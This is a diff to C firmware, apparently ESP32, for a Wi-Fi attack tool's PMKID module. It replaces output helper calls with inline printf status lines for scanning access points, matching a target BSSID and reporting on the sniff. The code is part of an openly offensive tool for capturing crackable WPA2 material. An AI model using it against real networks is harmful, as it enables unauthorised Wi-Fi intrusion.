@@ -9,7 +9,6 @@
 #include <stdio.h>
 #include <string.h>
 
-#include "arma_output.h"
 #include "arma_utils.h"
 #include "esp_err.h"
 #include "esp_event.h"
@@ -43,7 +42,9 @@ void pmkid_notif(void *args, esp_event_base_t event_base, int32_t event_id,
 
   if (notification_data->atk_context == PMKID_BASED) {
     arma_pmkid_finishing_sequence();
-    output_success_pmkid_attack(u_target_bssid);
+    uint8_t *b = u_target_bssid;
+    printf("{PMKID,SUCCESS,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1], b[2],
+           b[3], b[4], b[5]);
   }
 }
 
@@ -74,7 +75,7 @@ void arma_delete_task_pmkid_sniff_duration() {
 }
 
 void arma_pmkid_finishing_sequence() {
-  output_pmkid_finishing_sequence();
+  printf("{PMKID,FINISHING_SEQUENCE,}\n");
   frame_parser_unregister_data_frame_handler();
   frame_parser_clear_target_parameter();
   arma_pmkid_notif_event_unregister();
@@ -87,19 +88,21 @@ void arma_pmkid_sniff_duration() {
   printf(
       "arma_pmkid.arma_pmkid_sniff_duration > Task arma_pmkid_sniff_duration "
       "was created\n");
-  output_pmkid_operation_started(u_target_bssid);
+  uint8_t *b = u_target_bssid;
+  printf("{PMKID,SNIFF_STARTED,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1], b[2],
+         b[3], b[4], b[5]);
   int current_time = 0;
 
   while (1) {
     vTaskDelay(1000 / portTICK_PERIOD_MS);
-    output_pmkid_sniff_status(current_time);
+    printf("{PMKID,SNIFF_STATUS,%d,}\n", current_time);
     current_time++;
   }
 }
 
 void arma_pmkid_launching_sequence(uint8_t *ssid_name, uint8_t ssid_len,
                                    uint8_t channel) {
-  output_pmkid_launching_sequence();
+  printf("{PMKID,LAUNCHING_SEQUENCE,}\n");
   frame_parser_set_target_parameter(u_target_bssid, PARSE_PMKID);
   frame_parser_register_data_frame_handler();
   arma_pmkid_notif_event_register();
@@ -135,19 +138,23 @@ void arma_pmkid(char *target_bssid) {
   ap_list_from_scan_t *ap_list = wifi_get_scanned_aps();
   wifi_ap_record_t *ap_records = ap_list->ap_record_list;
   uint16_t total_scanned_aps = ap_list->count;
-  output_number_of_aps(total_scanned_aps);
+  printf("{PMKID,FOUND_APS,%u,}\n", total_scanned_aps);
 
   uint8_t found_target_ap = 0;
   uint8_t index_of_target_ap = 0;
   for (uint16_t i = 0; i < total_scanned_aps; i++) {
     wifi_ap_record_t ap_record = ap_records[i];
-    output_ap_info(&ap_record);
+    uint8_t *bssid = ap_record.bssid;
+    printf("{PMKID,SCAN,%02X%02X%02X%02X%02X%02X,%s,%02X,%02X,}\n", bssid[0],
+           bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ap_record.ssid,
+           (uint8_t)ap_record.rssi, (uint8_t)ap_record.primary);
 
     if (memcmp(ap_record.bssid, u_target_bssid, 6) == 0) {
       found_target_ap = 1;
       index_of_target_ap = i;
     }
   }
+  printf("{PMKID,FINISH_SCAN,}\n");
 
   if (found_target_ap == 1) {
     wifi_ap_record_t ap_record = ap_records[index_of_target_ap];
@@ -157,6 +164,8 @@ void arma_pmkid(char *target_bssid) {
     printf("arma_pmkid.arma_pmkid > Target AP channel: %u\n", channel);
     arma_pmkid_launching_sequence(ap_record.ssid, ssid_len, channel);
   } else if (found_target_ap == 0) {
-    output_failed_mic_not_found_ap(u_target_bssid);
+    uint8_t *b = u_target_bssid;
+    printf("{PMKID,AP_NOT_FOUND,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1], b[2],
+           b[3], b[4], b[5]);
   }
 }
